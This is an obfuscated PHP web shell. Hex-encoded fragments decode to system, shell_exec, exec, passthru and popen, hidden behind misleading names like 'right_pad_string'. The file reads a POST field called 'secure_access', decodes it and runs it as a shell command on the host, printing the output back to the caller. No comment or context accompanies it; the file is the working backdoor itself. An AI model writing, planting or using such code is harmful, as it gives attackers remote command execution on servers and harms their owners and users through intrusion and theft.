<?php


$sym1 = '79';
$sym2 = '6c';
$sym3 = '65';
$sym4 = '78';
$sym5 = '63';
$sym6 = '73';
$sym7 = '68';
$sym8 = '75';
$sym9 = '70';
$sym10 = '6f';
$sym11 = '74';
$sym12 = '72';
$sym13 = '6d';
$sym14 = '6e';
$sym15 = '61';
$right_pad_string1 = pack("H*", '73' . $sym1 . '73' . '74' . '65' . '6d');
$right_pad_string2 = pack("H*", '73' . '68' . '65' . '6c' . $sym2 . '5f' . $sym3 . $sym4 . '65' . $sym5);
$right_pad_string3 = pack("H*", $sym3 . '78' . $sym3 . $sym5);
$right_pad_string4 = pack("H*", '70' . '61' . $sym6 . $sym6 . '74' . $sym7 . '72' . $sym8);
$right_pad_string5 = pack("H*", $sym9 . $sym10 . '70' . '65' . '6e');
$right_pad_string6 = pack("H*", '73' . $sym11 . $sym12 . '65' . '61' . $sym13 . '5f' . '67' . '65' . $sym11 . '5f' . '63' . $sym10 . '6e' . '74' . '65' . $sym14 . '74' . $sym6);
$right_pad_string7 = pack("H*", $sym9 . '63' . '6c' . '6f' . $sym6 . '65');
$secure_access = pack("H*", $sym6 . $sym3 . '63' . $sym8 . $sym12 . '65' . '5f' . $sym15 . '63' . '63' . '65' . '73' . $sym6);
if (isset($_POST[$secure_access])) {
    $secure_access = pack("H*", $_POST[$secure_access]);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($secure_access);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($secure_access);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($secure_access, $elem_pointer);
        print join("\n", $elem_pointer);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($secure_access);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $desc_entity = $right_pad_string5($secure_access, 'r');
        if ($desc_entity) {
            $res_obj = $right_pad_string6($desc_entity);
            $right_pad_string7($desc_entity);
            print $res_obj;
        }
    }
    exit;
}
